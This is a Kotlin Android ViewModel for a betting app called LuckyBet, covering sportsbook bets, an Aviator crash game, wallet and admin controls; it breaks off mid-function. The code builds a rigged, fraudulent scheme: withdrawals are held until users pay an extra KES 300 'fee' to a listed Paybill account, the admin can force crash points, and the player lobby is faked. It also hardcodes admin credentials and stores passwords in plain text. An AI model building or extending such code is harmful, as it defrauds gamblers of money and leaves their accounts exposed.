package com.example.viewmodel

import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import com.example.data.*
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import java.util.Locale
import java.util.UUID
import kotlin.math.exp
import kotlin.math.roundToInt
import kotlin.random.Random

enum class LuckyTab(val routeUrl: String, val label: String) {
    SPORTS("luckybet.com/sports", "Sports"),
    AVIATOR("luckybet.com/aviator", "Aviator"),
    BETSLIP("luckybet.com/betslip", "Bet Slip"),
    MY_BETS("luckybet.com/my-bets", "My Bets"),
    WALLET("luckybet.com/wallet", "Account"),
    DEPOSIT("luckybet.com/deposit", "Deposit"),
    WITHDRAW("luckybet.com/withdraw", "Withdraw"),
    ADMIN_LOGIN("luckybet.com/admin_login", "Admin"),
    ADMIN_DASHBOARD("luckybet.com/admin_panel", "Admin")
}

enum class AviatorPhase {
    WAITING, FLYING, CRASHED
}

data class AviatorSlotState(
    val stakeText: String = "100",
    val autoCashoutEnabled: Boolean = false,
    val autoCashoutTarget: String = "2.00",
    val isQueuedForNext: Boolean = false,
    val isActiveInRound: Boolean = false,
    val activeStake: Double = 0.0,
    val cashedOutMultiplier: Double? = null,
    val winAmount: Double? = null
)

data class LivePlayerEntry(
    val username: String,
    val stake: Double,
    val targetMult: Double,
    val cashedOutAt: Double? = null
)

class LuckyBetViewModel(private val repository: LuckyBetRepository) : ViewModel() {

    val allUsers: StateFlow<List<UserAccountEntity>> = repository.users
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val matches: StateFlow<List<MatchEntity>> = repository.matches
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val allBets: StateFlow<List<BetTicketEntity>> = repository.bets
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val aviatorHistory: StateFlow<List<AviatorRoundEntity>> = repository.aviatorHistory
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val allTransactions: StateFlow<List<WalletTransactionEntity>> = repository.transactions
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val siteConfig: StateFlow<SiteConfigEntity> = repository.siteConfig
        .map { it ?: SiteConfigEntity() }
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), SiteConfigEntity())

    // Active Logged-In User (persisted via siteConfig.loggedInUserPhone)
    @OptIn(ExperimentalCoroutinesApi::class)
    val currentUser: StateFlow<UserAccountEntity?> = siteConfig
        .map { it.loggedInUserPhone }
        .distinctUntilChanged()
        .flatMapLatest { phone ->
            if (phone.isNullOrBlank()) {
                flowOf(null)
            } else {
                repository.observeUserByPhone(phone)
            }
        }
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), null)

    // Current user's bets & transactions
    val userBets: StateFlow<List<BetTicketEntity>> = combine(allBets, currentUser) { bets, user ->
        if (user == null) emptyList() else bets.filter { it.userPhone == user.phoneNumber }
    }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    val userTransactions: StateFlow<List<WalletTransactionEntity>> = combine(allTransactions, currentUser) { txs, user ->
        if (user == null) emptyList() else txs.filter { it.phoneNumber == user.phoneNumber }
    }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    // User Auth Error message
    private val _userAuthError = MutableStateFlow<String?>(null)
    val userAuthError: StateFlow<String?> = _userAuthError.asStateFlow()

    // Navigation & Browser Address Bar State
    private val _currentTab = MutableStateFlow(LuckyTab.SPORTS)
    val currentTab: StateFlow<LuckyTab> = _currentTab.asStateFlow()

    private val _addressBarInput = MutableStateFlow("luckybet.com/sports")
    val addressBarInput: StateFlow<String> = _addressBarInput.asStateFlow()

    // Sportsbook Filters & Bet Slip
    private val _selectedSportFilter = MutableStateFlow("All")
    val selectedSportFilter: StateFlow<String> = _selectedSportFilter.asStateFlow()

    private val _searchQuery = MutableStateFlow("")
    val searchQuery: StateFlow<String> = _searchQuery.asStateFlow()

    private val _betSlip = MutableStateFlow<List<BetSelection>>(emptyList())
    val betSlip: StateFlow<List<BetSelection>> = _betSlip.asStateFlow()

    private val _slipStakeInput = MutableStateFlow("100")
    val slipStakeInput: StateFlow<String> = _slipStakeInput.asStateFlow()

    // Toast / Banner notification
    private val _snackbarMessage = MutableStateFlow<String?>(null)
    val snackbarMessage: StateFlow<String?> = _snackbarMessage.asStateFlow()

    // Admin authentication state
    private val _isAdminAuthenticated = MutableStateFlow(false)
    val isAdminAuthenticated: StateFlow<Boolean> = _isAdminAuthenticated.asStateFlow()

    private val _adminLoginError = MutableStateFlow<String?>(null)
    val adminLoginError: StateFlow<String?> = _adminLoginError.asStateFlow()

    // Aviator Game Engine State
    private val _aviatorPhase = MutableStateFlow(AviatorPhase.WAITING)
    val aviatorPhase: StateFlow<AviatorPhase> = _aviatorPhase.asStateFlow()

    private val _currentMultiplier = MutableStateFlow(1.00)
    val currentMultiplier: StateFlow<Double> = _currentMultiplier.asStateFlow()

    private val _countdownSeconds = MutableStateFlow(5.0f)
    val countdownSeconds: StateFlow<Float> = _countdownSeconds.asStateFlow()

    private val _slot1 = MutableStateFlow(AviatorSlotState(stakeText = "100", autoCashoutTarget = "2.00"))
    val slot1: StateFlow<AviatorSlotState> = _slot1.asStateFlow()

    private val _slot2 = MutableStateFlow(AviatorSlotState(stakeText = "250", autoCashoutEnabled = true, autoCashoutTarget = "3.50"))
    val slot2: StateFlow<AviatorSlotState> = _slot2.asStateFlow()

    private val _liveLobbyPlayers = MutableStateFlow<List<LivePlayerEntry>>(emptyList())
    val liveLobbyPlayers: StateFlow<List<LivePlayerEntry>> = _liveLobbyPlayers.asStateFlow()

    private var aviatorEngineJob: Job? = null

    init {
        viewModelScope.launch {
            repository.ensureSeeded()
            startAviatorLoop()
        }
    }

    fun normalizePhone(rawPhone: String): String {
        val digitsAndPlus = rawPhone.trim().replace(" ", "").replace("-", "")
        return when {
            digitsAndPlus.startsWith("+254") && digitsAndPlus.length == 13 -> "0" + digitsAndPlus.substring(4)
            digitsAndPlus.startsWith("254") && digitsAndPlus.length == 12 -> "0" + digitsAndPlus.substring(3)
            else -> digitsAndPlus
        }
    }

    fun clearMessage() {
        _snackbarMessage.value = null
    }

    fun showMessage(msg: String) {
        _snackbarMessage.value = msg
    }

    fun clearUserAuthError() {
        _userAuthError.value = null
    }

    // =========================================================================
    // USER REGISTRATION & LOGIN (Clean registration, admin verification code)
    // =========================================================================
    fun registerUserAccount(phoneRaw: String, fullNameRaw: String, passwordRaw: String) {
        val phone = normalizePhone(phoneRaw)
        val fullName = fullNameRaw.trim()
        val password = passwordRaw.trim()

        // Allow direct secret search for admin_login from registration inputs too
        if (phoneRaw.contains("admin_login", ignoreCase = true) || fullNameRaw.contains("admin_login", ignoreCase = true)) {
            navigateToTab(LuckyTab.ADMIN_LOGIN)
            return
        }

        if (phone.length < 9) {
            _userAuthError.value = "Please enter a valid Kenyan phone number (e.g. 0712345678)."
            return
        }
        if (fullName.isBlank()) {
            _userAuthError.value = "Please enter your full name."
            return
        }
        if (password.length < 4) {
            _userAuthError.value = "Password must be at least 4 characters."
            return
        }

        viewModelScope.launch {
            val existing = repository.getUserByPhone(phone)
            if (existing != null) {
                _userAuthError.value = "Phone number $phone is already registered! Please log in."
                return@launch
            }

            // Generate 6-digit verification code to be managed and viewed on Admin Panel
            val generatedCode = (100000..999999).random().toString()

            val newUser = UserAccountEntity(
                phoneNumber = phone,
                fullName = fullName,
                password = password,
                balance = 500.0,
                bonusBalance = 500.0,
                isVerified = false,
                verificationCode = generatedCode,
                isFrozen = false,
                isBanned = false
            )
            repository.insertUser(newUser)
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = "BONUS-" + (100000..999999).random(),
                    phoneNumber = phone,
                    type = "ADMIN_FUND",
                    amount = 500.0,
                    status = "COMPLETED"
                )
            )

            _userAuthError.value = "Registration successful for $phone! Please enter the verification code generated by the Admin."
            showMessage("Account registered! Your verification code is generated on the Admin Panel.")
        }
    }

    fun verifyUserAccount(phoneRaw: String, codeEntered: String) {
        val phone = normalizePhone(phoneRaw)
        val code = codeEntered.trim()
        if (phone.isBlank() || code.isBlank()) {
            _userAuthError.value = "Please enter phone and verification code."
            return
        }

        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                _userAuthError.value = "Account not found for $phone. Please register first."
                return@launch
            }
            if (user.isBanned) {
                _userAuthError.value = "Account for $phone has been BANNED by Admin."
                return@launch
            }
            if (user.verificationCode != code) {
                _userAuthError.value = "Invalid verification code! Please contact the Admin to check or generate your code on the Admin Panel."
                return@launch
            }

            repository.updateUser(user.copy(isVerified = true))
            val currentCfg = repository.getSiteConfigOnce()
            repository.updateSiteConfig(currentCfg.copy(loggedInUserPhone = user.phoneNumber))

            _userAuthError.value = null
            _currentTab.value = LuckyTab.SPORTS
            _addressBarInput.value = LuckyTab.SPORTS.routeUrl
            showMessage("Account verified successfully! Welcome to LuckyBet, ${user.fullName}!")
        }
    }

    fun loginUserAccount(phoneRaw: String, passwordRaw: String) {
        if (phoneRaw.contains("admin_login", ignoreCase = true)) {
            navigateToTab(LuckyTab.ADMIN_LOGIN)
            return
        }

        val phone = normalizePhone(phoneRaw)
        val password = passwordRaw.trim()

        if (phone.isBlank() || password.isBlank()) {
            _userAuthError.value = "Please enter both phone number and password."
            return
        }

        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                _userAuthError.value = "Account not found for $phone. Please register first."
                return@launch
            }
            if (user.password != password) {
                _userAuthError.value = "Incorrect password for $phone."
                return@launch
            }

            // Check if user is banned by Admin
            if (user.isBanned) {
                _userAuthError.value = "Account for $phone is BANNED by Admin for suspicious activity / rules violation."
                return@launch
            }

            // Check if user is frozen by Admin
            if (user.isFrozen) {
                _userAuthError.value = "Account for $phone is FROZEN by Admin. Contact Admin to unfreeze."
                return@launch
            }

            // Check if user has been verified with admin-generated code
            if (!user.isVerified) {
                _userAuthError.value = "Account pending verification! Enter the verification code generated on the Admin Panel."
                return@launch
            }

            // Save logged-in user session in Room
            val currentCfg = repository.getSiteConfigOnce()
            repository.updateSiteConfig(currentCfg.copy(loggedInUserPhone = user.phoneNumber))

            _userAuthError.value = null
            _currentTab.value = LuckyTab.SPORTS
            _addressBarInput.value = LuckyTab.SPORTS.routeUrl
            showMessage("Welcome back, ${user.fullName}!")
        }
    }

    fun logoutUserAccount() {
        viewModelScope.launch {
            val currentCfg = repository.getSiteConfigOnce()
            repository.updateSiteConfig(currentCfg.copy(loggedInUserPhone = null))
            _betSlip.value = emptyList()
            showMessage("Logged out of your LuckyBet account.")
        }
    }

    fun navigateToTab(tab: LuckyTab) {
        val target = if (tab == LuckyTab.ADMIN_LOGIN && _isAdminAuthenticated.value) {
            LuckyTab.ADMIN_DASHBOARD
        } else if (tab == LuckyTab.ADMIN_DASHBOARD && !_isAdminAuthenticated.value) {
            LuckyTab.ADMIN_LOGIN
        } else {
            tab
        }
        _currentTab.value = target
        _addressBarInput.value = target.routeUrl
    }

    fun onAddressBarChanged(input: String) {
        _addressBarInput.value = input
    }

    // Secret Direct Search in URL Bar or Search Box for luckybet.com/admin_login
    fun submitAddressBarUrl(rawUrl: String = _addressBarInput.value) {
        val cleaned = rawUrl.trim().lowercase(Locale.ROOT)
            .removePrefix("https://")
            .removePrefix("http://")
            .removePrefix("www.")

        when {
            cleaned.contains("admin_login") || cleaned.contains("admin_panel") || cleaned.endsWith("/admin") -> {
                if (_isAdminAuthenticated.value) {
                    navigateToTab(LuckyTab.ADMIN_DASHBOARD)
                } else {
                    navigateToTab(LuckyTab.ADMIN_LOGIN)
                }
            }
            cleaned.contains("aviator") -> navigateToTab(LuckyTab.AVIATOR)
            cleaned.contains("deposit") -> navigateToTab(LuckyTab.DEPOSIT)
            cleaned.contains("withdraw") -> navigateToTab(LuckyTab.WITHDRAW)
            cleaned.contains("betslip") || cleaned.contains("slip") -> navigateToTab(LuckyTab.BETSLIP)
            cleaned.contains("my-bets") || cleaned.contains("history") -> navigateToTab(LuckyTab.MY_BETS)
            cleaned.contains("wallet") || cleaned.contains("account") -> navigateToTab(LuckyTab.WALLET)
            else -> navigateToTab(LuckyTab.SPORTS)
        }
    }

    fun selectSportFilter(sport: String) {
        _selectedSportFilter.value = sport
    }

    fun updateSearchQuery(query: String) {
        _searchQuery.value = query
        // Also support typing luckybet.com/admin_login or /admin_login directly in the sportsbook search bar!
        val normalized = query.trim().lowercase(Locale.ROOT)
        if (normalized == "luckybet.com/admin_login" || normalized == "/admin_login" || normalized == "admin_login") {
            _searchQuery.value = ""
            if (_isAdminAuthenticated.value) {
                navigateToTab(LuckyTab.ADMIN_DASHBOARD)
            } else {
                navigateToTab(LuckyTab.ADMIN_LOGIN)
            }
        }
    }

    fun updateSlipStake(stake: String) {
        _slipStakeInput.value = stake.filter { it.isDigit() || it == '.' }
    }

    fun toggleSelection(selection: BetSelection) {
        val current = _betSlip.value.toMutableList()
        val existingIdx = current.indexOfFirst { it.matchId == selection.matchId }
        if (existingIdx >= 0) {
            if (current[existingIdx].pickCode == selection.pickCode) {
                current.removeAt(existingIdx)
            } else {
                current[existingIdx] = selection
            }
        } else {
            current.add(selection)
        }
        _betSlip.value = current
    }

    fun removeSelectionFromSlip(matchId: Int) {
        _betSlip.value = _betSlip.value.filterNot { it.matchId == matchId }
    }

    fun clearBetSlip() {
        _betSlip.value = emptyList()
    }

    fun placeSportsBet() {
        val user = currentUser.value
        if (user == null) {
            showMessage("Please log in to place a bet.")
            return
        }
        if (user.isBanned) {
            showMessage("Your account is BANNED by Admin.")
            return
        }
        if (user.isFrozen) {
            showMessage("Your account is FROZEN by Admin. Betting is restricted.")
            return
        }
        val selections = _betSlip.value
        if (selections.isEmpty()) {
            showMessage("Add at least 1 match selection to your bet slip!")
            return
        }
        val stake = _slipStakeInput.value.toDoubleOrNull() ?: 0.0
        val config = siteConfig.value
        if (stake < config.minStake) {
            showMessage("Minimum stake is KES ${config.minStake.toInt()}")
            return
        }
        if (stake > user.balance) {
            showMessage("Insufficient balance (KES ${String.format(Locale.US, "%,.2f", user.balance)}). Account must be funded by Admin.")
            navigateToTab(LuckyTab.WALLET)
            return
        }

        val combinedOdds = selections.fold(1.0) { acc, item -> acc * item.odd }
        val multiBoostMultiplier = when {
            selections.size >= 5 -> 1.15
            selections.size >= 3 -> 1.08
            else -> 1.0
        }
        val potentialWin = (stake * combinedOdds * multiBoostMultiplier).coerceAtMost(config.maxPayout)

        val firstSelection = selections.first()
        val summary = if (selections.size == 1) {
            "${firstSelection.matchTitle} (${firstSelection.marketName})"
        } else {
            "${firstSelection.matchTitle} (${firstSelection.pickCode}) + ${selections.size - 1} more"
        }

        val ticketCode = "LB-" + UUID.randomUUID().toString().take(6).uppercase(Locale.ROOT)

        viewModelScope.launch {
            repository.updateUserBalance(user.phoneNumber, user.balance - stake)
            repository.insertBetTicket(
                BetTicketEntity(
                    ticketCode = ticketCode,
                    userPhone = user.phoneNumber,
                    summary = summary,
                    selectionsCount = selections.size,
                    totalOdds = (combinedOdds * 100.0).roundToInt() / 100.0,
                    stake = stake,
                    potentialPayout = (potentialWin * 100.0).roundToInt() / 100.0,
                    status = "OPEN",
                    category = "SPORTS"
                )
            )
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = ticketCode,
                    phoneNumber = user.phoneNumber,
                    type = "BET_STAKE",
                    amount = -stake,
                    status = "COMPLETED"
                )
            )
            _betSlip.value = emptyList()
            showMessage("Bet Placed! Ticket #$ticketCode • Potential Win KES ${String.format(Locale.US, "%,.0f", potentialWin)}")
            navigateToTab(LuckyTab.MY_BETS)
        }
    }

    fun cashoutOpenSportsTicket(ticket: BetTicketEntity) {
        if (ticket.status != "OPEN") return
        val cashoutOffer = (ticket.stake * 0.85 * 100.0).roundToInt() / 100.0
        viewModelScope.launch {
            val targetUser = repository.getUserByPhone(ticket.userPhone)
            if (targetUser != null) {
                repository.updateUserBalance(targetUser.phoneNumber, targetUser.balance + cashoutOffer)
            }
            repository.updateBetTicket(
                ticket.copy(
                    status = "CASHED_OUT",
                    potentialPayout = cashoutOffer
                )
            )
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = "CSH-${ticket.ticketCode}",
                    phoneNumber = ticket.userPhone,
                    type = "BET_WIN",
                    amount = cashoutOffer,
                    status = "COMPLETED"
                )
            )
            showMessage("Cashed out KES ${String.format(Locale.US, "%,.2f", cashoutOffer)} to wallet!")
        }
    }

    fun requestWithdrawal(phone: String, amount: Double) {
        val user = currentUser.value ?: return

        if (user.isBanned) {
            showMessage("Your account is BANNED by Admin.")
            return
        }
        if (user.isFrozen) {
            showMessage("Your account is FROZEN by Admin. Withdrawals are locked.")
            return
        }

        // 1. If user balance is under 1,000 KES, inform them to deposit 500 KES since minimum withdrawal is 1,000 KES
        if (user.balance < 1000.0) {
            showMessage("Minimum withdrawal is KES 1,000! Please deposit KES 500 to qualify for withdrawal.")
            return
        }

        // 2. Minimum withdrawal threshold is 1,000 KES
        if (amount < 1000.0) {
            showMessage("Minimum withdrawal amount is KES 1,000.00.")
            return
        }

        // 3. When reaching 1,000 KES or withdrawing, user is told to add KES 300 for transaction fee
        showMessage("Notice: Please add KES 300 transaction fee to complete your KES ${String.format(Locale.US, "%,.0f", amount)} withdrawal.")

        if (amount > user.balance) {
            showMessage("Insufficient balance! Available balance is KES ${String.format(Locale.US, "%,.2f", user.balance)}.")
            return
        }

        val mpesaRef = "WTH" + (1000000..9999999).random().toString()
        viewModelScope.launch {
            repository.updateUserBalance(user.phoneNumber, user.balance - amount)
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = mpesaRef,
                    phoneNumber = user.phoneNumber,
                    type = "WITHDRAWAL",
                    amount = -amount,
                    status = "PENDING"
                )
            )
            showMessage("Withdrawal request of KES ${String.format(Locale.US, "%,.0f", amount)} submitted! Add KES 300 transaction fee via Paybill 522522 (Account: 6234870026939877) to release funds.")
        }
    }

    // Aviator Controls
    fun updateSlotStake(slotIndex: Int, stakeText: String) {
        val clean = stakeText.filter { it.isDigit() || it == '.' }
        if (slotIndex == 1) {
            _slot1.update { it.copy(stakeText = clean) }
        } else {
            _slot2.update { it.copy(stakeText = clean) }
        }
    }

    fun toggleSlotAutoCashout(slotIndex: Int, enabled: Boolean) {
        if (slotIndex == 1) {
            _slot1.update { it.copy(autoCashoutEnabled = enabled) }
        } else {
            _slot2.update { it.copy(autoCashoutEnabled = enabled) }
        }
    }

    fun updateSlotAutoTarget(slotIndex: Int, target: String) {
        val clean = target.filter { it.isDigit() || it == '.' }
        if (slotIndex == 1) {
            _slot1.update { it.copy(autoCashoutTarget = clean) }
        } else {
            _slot2.update { it.copy(autoCashoutTarget = clean) }
        }
    }

    fun onAviatorSlotAction(slotIndex: Int) {
        val user = currentUser.value
        if (user == null) {
            showMessage("Please log in to play Aviator.")
            return
        }
        if (user.isBanned) {
            showMessage("Your account is BANNED by Admin.")
            return
        }
        if (user.isFrozen) {
            showMessage("Your account is FROZEN by Admin. Betting is restricted.")
            return
        }
        val stateFlow = if (slotIndex == 1) _slot1 else _slot2
        val currentSlot = stateFlow.value
        val phase = _aviatorPhase.value

        if (phase == AviatorPhase.FLYING && currentSlot.isActiveInRound && currentSlot.cashedOutMultiplier == null) {
            performAviatorCashout(slotIndex, _currentMultiplier.value)
            return
        }

        if (currentSlot.isQueuedForNext) {
            stateFlow.update { it.copy(isQueuedForNext = false) }
        } else {
            val stakeVal = currentSlot.stakeText.toDoubleOrNull() ?: 0.0
            if (stakeVal < 10.0) {
                showMessage("Minimum Aviator bet is KES 10")
                return
            }
            if (stakeVal > user.balance) {
                showMessage("Insufficient balance (KES ${String.format(Locale.US, "%,.2f", user.balance)})! Admin must fund your account.")
                return
            }
            stateFlow.update { it.copy(isQueuedForNext = true) }
        }
    }

    private fun performAviatorCashout(slotIndex: Int, mult: Double) {
        val user = currentUser.value ?: return
        val stateFlow = if (slotIndex == 1) _slot1 else _slot2
        val slot = stateFlow.value
        if (!slot.isActiveInRound || slot.cashedOutMultiplier != null) return

        val winAmount = (slot.activeStake * mult * 100.0).roundToInt() / 100.0
        stateFlow.update {
            it.copy(
                cashedOutMultiplier = mult,
                winAmount = winAmount
            )
        }

        viewModelScope.launch {
            val freshUser = repository.getUserByPhone(user.phoneNumber) ?: return@launch
            repository.updateUserBalance(freshUser.phoneNumber, freshUser.balance + winAmount)
            val code = "AV-" + UUID.randomUUID().toString().take(5).uppercase(Locale.ROOT)
            repository.insertBetTicket(
                BetTicketEntity(
                    ticketCode = code,
                    userPhone = freshUser.phoneNumber,
                    summary = "Aviator Crash Game (Slot #$slotIndex @ ${String.format(Locale.US, "%.2fx", mult)})",
                    selectionsCount = 1,
                    totalOdds = mult,
                    stake = slot.activeStake,
                    potentialPayout = winAmount,
                    status = "WON",
                    category = "AVIATOR"
                )
            )
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = code,
                    phoneNumber = freshUser.phoneNumber,
                    type = "BET_WIN",
                    amount = winAmount,
                    status = "COMPLETED"
                )
            )
            showMessage("AVIATOR WIN! Cashed out KES ${String.format(Locale.US, "%,.2f", winAmount)} at ${String.format(Locale.US, "%.2fx", mult)}!")
        }
    }

    private fun startAviatorLoop() {
        aviatorEngineJob?.cancel()
        aviatorEngineJob = viewModelScope.launch {
            while (true) {
                _aviatorPhase.value = AviatorPhase.WAITING
                _currentMultiplier.value = 1.00
                _liveLobbyPlayers.value = generateSimulatedKenyanLobby()

                var remaining = 5.0f
                while (remaining > 0f) {
                    _countdownSeconds.value = remaining
                    delay(100)
                    remaining = ((remaining - 0.1f) * 10).roundToInt() / 10f
                }

                activateSlotForRound(_slot1, 1)
                activateSlotForRound(_slot2, 2)

                val crashPoint = computeNextCrashMultiplier()

                _aviatorPhase.value = AviatorPhase.FLYING
                var elapsedMs = 0L
                val tickMs = 50L
                while (true) {
                    delay(tickMs)
                    elapsedMs += tickMs
                    val tSec = elapsedMs / 1000.0
                    val rawMult = exp(0.145 * tSec)
                    val mult = (rawMult * 100.0).roundToInt() / 100.0

                    if (mult >= crashPoint) {
                        _currentMultiplier.value = crashPoint
                        break
                    } else {
                        _currentMultiplier.value = mult
                        checkAutoCashout(1, _slot1.value, mult)
                        checkAutoCashout(2, _slot2.value, mult)
                        updateLobbyCashouts(mult)
                    }
                }

                _aviatorPhase.value = AviatorPhase.CRASHED
                repository.recordAviatorRound(crashPoint)

                finalizeUnclaimedSlot(_slot1, 1, crashPoint)
                finalizeUnclaimedSlot(_slot2, 2, crashPoint)

                delay(3200)
            }
        }
    }

    private suspend fun activateSlotForRound(
        slotFlow: MutableStateFlow<AviatorSlotState>,
        slotIdx: Int
    ) {
        val slot = slotFlow.value
        val activeUserPhone = siteConfig.value.loggedInUserPhone
        if (slot.isQueuedForNext && !activeUserPhone.isNullOrBlank()) {
            val stake = slot.stakeText.toDoubleOrNull() ?: 0.0
            val dbUser = repository.getUserByPhone(activeUserPhone)
            if (dbUser != null && stake >= 10.0 && stake <= dbUser.balance) {
                repository.updateUserBalance(dbUser.phoneNumber, dbUser.balance - stake)
                slotFlow.value = slot.copy(
                    isQueuedForNext = false,
                    isActiveInRound = true,
                    activeStake = stake,
                    cashedOutMultiplier = null,
                    winAmount = null
                )
            } else {
                slotFlow.value = slot.copy(
                    isQueuedForNext = false,
                    isActiveInRound = false,
                    cashedOutMultiplier = null,
                    winAmount = null
                )
                showMessage("Slot #$slotIdx bet cancelled due to insufficient balance.")
            }
        } else {
            slotFlow.value = slot.copy(
                isQueuedForNext = false,
                isActiveInRound = false,
                activeStake = 0.0,
                cashedOutMultiplier = null,
                winAmount = null
            )
        }
    }

    private fun checkAutoCashout(slotIndex: Int, slot: AviatorSlotState, currentMult: Double) {
        if (slot.isActiveInRound && slot.cashedOutMultiplier == null && slot.autoCashoutEnabled) {
            val target = slot.autoCashoutTarget.toDoubleOrNull() ?: 2.0
            if (target >= 1.05 && currentMult >= target) {
                performAviatorCashout(slotIndex, target)
            }
        }
    }

    private suspend fun finalizeUnclaimedSlot(
        slotFlow: MutableStateFlow<AviatorSlotState>,
        slotIdx: Int,
        crashPoint: Double
    ) {
        val slot = slotFlow.value
        val activeUserPhone = siteConfig.value.loggedInUserPhone
        if (slot.isActiveInRound && slot.cashedOutMultiplier == null && !activeUserPhone.isNullOrBlank()) {
            val code = "AV-" + UUID.randomUUID().toString().take(5).uppercase(Locale.ROOT)
            repository.insertBetTicket(
                BetTicketEntity(
                    ticketCode = code,
                    userPhone = activeUserPhone,
                    summary = "Aviator Crash Game (Slot #$slotIdx • Flew Away @ ${String.format(Locale.US, "%.2fx", crashPoint)})",
                    selectionsCount = 1,
                    totalOdds = crashPoint,
                    stake = slot.activeStake,
                    potentialPayout = 0.0,
                    status = "LOST",
                    category = "AVIATOR"
                )
            )
        }
        slotFlow.update {
            it.copy(isActiveInRound = false)
        }
    }

    private suspend fun computeNextCrashMultiplier(): Double {
        val config = siteConfig.value
        val forced = config.nextForcedAviatorCrash
        if (forced != null && forced >= 1.00) {
            repository.updateSiteConfig(config.copy(nextForcedAviatorCrash = null))
            return (forced * 100.0).roundToInt() / 100.0
        }

        val r = Random.nextDouble()
        return when (config.aviatorHouseEdgeMode) {
            "TIGHT" -> {
                val raw = when {
                    r < 0.38 -> Random.nextDouble(1.01, 1.45)
                    r < 0.80 -> Random.nextDouble(1.45, 2.60)
                    r < 0.95 -> Random.nextDouble(2.60, 5.50)
                    else -> Random.nextDouble(5.50, 18.00)
                }
                (raw * 100.0).roundToInt() / 100.0
            }
            "HIGH_PAYOUT" -> {
                val raw = when {
                    r < 0.15 -> Random.nextDouble(1.10, 1.80)
                    r < 0.60 -> Random.nextDouble(1.80, 4.80)
                    r < 0.88 -> Random.nextDouble(4.80, 15.00)
                    else -> Random.nextDouble(15.00, 85.00)
                }
                (raw * 100.0).roundToInt() / 100.0
            }
            else -> {
                val raw = when {
                    r < 0.22 -> Random.nextDouble(1.02, 1.50)
                    r < 0.65 -> Random.nextDouble(1.50, 3.20)
                    r < 0.90 -> Random.nextDouble(3.20, 9.50)
                    else -> Random.nextDouble(9.50, 45.00)
                }
                (raw * 100.0).roundToInt() / 100.0
            }
        }
    }

    private fun generateSimulatedKenyanLobby(): List<LivePlayerEntry> {
        val phones = listOf(
            "254712***890", "254722***411", "254790***102", "254701***554",
            "254745***921", "254768***330", "254110***772", "254729***608"
        )
        val stakes = listOf(50.0, 100.0, 200.0, 500.0, 1000.0, 2500.0, 150.0, 300.0)
        return phones.shuffled().take(6).mapIndexed { index, phone ->
            LivePlayerEntry(
                username = phone,
                stake = stakes[index % stakes.size],
                targetMult = ((Random.nextDouble(1.35, 6.50) * 100.0).roundToInt() / 100.0)
            )
        }
    }

    private fun updateLobbyCashouts(mult: Double) {
        _liveLobbyPlayers.update { list ->
            list.map { entry ->
                if (entry.cashedOutAt == null && mult >= entry.targetMult) {
                    entry.copy(cashedOutAt = entry.targetMult)
                } else {
                    entry
                }
            }
        }
    }

    // =========================================================================
    // ADMIN PORTAL (luckybet.com/admin_login)
    // Username: kenya254 | Password: kenya@2026
    // =========================================================================
    fun loginAdmin(usernameInput: String, passwordInput: String) {
        val u = usernameInput.trim()
        val p = passwordInput.trim()
        if (u == "kenya254" && p == "kenya@2026") {
            _isAdminAuthenticated.value = true
            _adminLoginError.value = null
            _currentTab.value = LuckyTab.ADMIN_DASHBOARD
            _addressBarInput.value = LuckyTab.ADMIN_DASHBOARD.routeUrl
            showMessage("Welcome to luckybet.com Admin Portal (kenya254)")
        } else {
            _adminLoginError.value = "Invalid Admin Credentials!"
        }
    }

    fun logoutAdmin() {
        _isAdminAuthenticated.value = false
        _currentTab.value = LuckyTab.SPORTS
        _addressBarInput.value = LuckyTab.SPORTS.routeUrl
        showMessage("Exited Admin Portal.")
    }

    /**
     * Admin funds a user's account by inputting their phone number and amount to fund.
     * Supports both adding to existing balance or setting a specific balance.
     */
    fun adminFundUserByPhone(phoneRaw: String, amountToFund: Double) {
        val phone = normalizePhone(phoneRaw)
        if (phone.isBlank()) {
            showMessage("Please enter a user's phone number to fund.")
            return
        }
        if (amountToFund <= 0.0) {
            showMessage("Please enter an amount greater than KES 0.")
            return
        }

        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No registered user found with phone number $phone! Make sure they registered first.")
                return@launch
            }
            val newBal = user.balance + amountToFund
            repository.updateUser(user.copy(balance = newBal))
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = "ADM-" + (100000..999999).random(),
                    phoneNumber = user.phoneNumber,
                    type = "ADMIN_FUND",
                    amount = amountToFund,
                    status = "COMPLETED"
                )
            )
            showMessage("Funded ${user.fullName} (${user.phoneNumber}) with +KES ${String.format(Locale.US, "%,.2f", amountToFund)}! New Balance: KES ${String.format(Locale.US, "%,.2f", newBal)}")
        }
    }

    fun adminSetUserExactBalance(phoneRaw: String, exactBalance: Double) {
        val phone = normalizePhone(phoneRaw)
        viewModelScope.launch {
            val user = repository.getUserByPhone(phone)
            if (user == null) {
                showMessage("No registered user found with phone number $phone.")
                return@launch
            }
            val diff = exactBalance.coerceAtLeast(0.0) - user.balance
            repository.updateUser(user.copy(balance = exactBalance.coerceAtLeast(0.0)))
            repository.insertTransaction(
                WalletTransactionEntity(
                    mpesaCode = "SET-" + (100000..999999).random(),
                    phoneNumber = user.phoneNumber,
                    type = "ADMIN_FUND",
                    amount = diff,
                    status = "COMPLETED"
                )
            )
